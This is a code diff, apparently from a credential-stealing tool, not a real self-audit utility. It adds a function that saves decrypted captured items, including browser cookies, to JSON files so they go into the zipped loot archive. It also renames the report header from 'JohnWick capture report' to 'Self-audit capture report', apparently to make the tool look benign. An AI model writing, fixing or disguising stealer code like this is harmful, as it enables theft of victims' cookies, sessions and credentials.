@@ -33,6 +33,32 @@ def _ep(token: str, method: str) -> str:
 
 
 # ------------------------------------------------------------------ archive
+def write_items(stage: str, caps) -> list[str]:
+    """Persist decrypted capture items into the staging tree as JSON.
+
+    Without this, `cap.items` lives only in memory: the report prints counts and
+    the zip ships only staged files (extension LevelDB etc.), so a run that
+    "captured 704 cookies" delivers zero cookie data. One file per capture kind,
+    named <kind>.json under items/. Returns the paths written.
+    """
+    out = []
+    items_dir = os.path.join(stage, "items")
+    for c in caps:
+        if not getattr(c, "items", None):
+            continue
+        try:
+            os.makedirs(items_dir, exist_ok=True)
+            safe = "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in c.kind)
+            path = os.path.join(items_dir, f"{safe}.json")
+            with open(path, "w", encoding="utf-8") as f:
+                json.dump({"kind": c.kind, "note": c.note, "items": c.items},
+                          f, ensure_ascii=False, indent=1, default=str)
+            out.append(path)
+        except OSError:
+            continue   # one unwritable kind must not drop the rest
+    return out
+
+
 def build_archive(stage: str, out_path: str, caps) -> tuple[str, int, int]:
     """Zip the staging tree under a hard size cap. Returns (path, size, n_files).
 
@@ -63,7 +89,7 @@ def build_archive(stage: str, out_path: str, caps) -> tuple[str, int, int]:
 # ------------------------------------------------------------------ text report
 def render_report(caps, system: dict, probe_rows=None) -> str:
     lines = [
-        f"# JohnWick capture report",
+        f"# Self-audit capture report",
         f"host: {system.get('hostname','?')}  user: {system.get('username','?')}",
         f"platform: {system.get('platform','?')} {system.get('release','?')} "
         f"({system.get('machine','?')})  elevation: {system.get('elevation','?')}",
